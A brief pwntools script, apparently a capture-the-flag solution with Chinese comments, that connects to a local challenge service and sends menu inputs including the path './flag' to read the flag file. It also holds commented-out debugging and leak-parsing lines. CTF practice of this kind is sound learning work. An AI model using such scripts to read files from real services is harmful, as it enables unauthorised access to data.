from pwn import *                                    # 导入 pwntools。
context(arch='amd64', os='linux', log_level='debug') # 一些基本的配置。
# io = process('./pwn')             # 在本地运行程序。
# gdb.attach(io)                    # 启动 GDB
io = connect("127.0.0.1",43053)          

# io.recvuntil(b"hint.")
# num = io.recv(8)
# print(num)
# num = u64(num.ljust(8,b"\x00")) 
                     
io.sendline('3')
io.sendline('./flag')
io.sendline('1')

io.interactive()                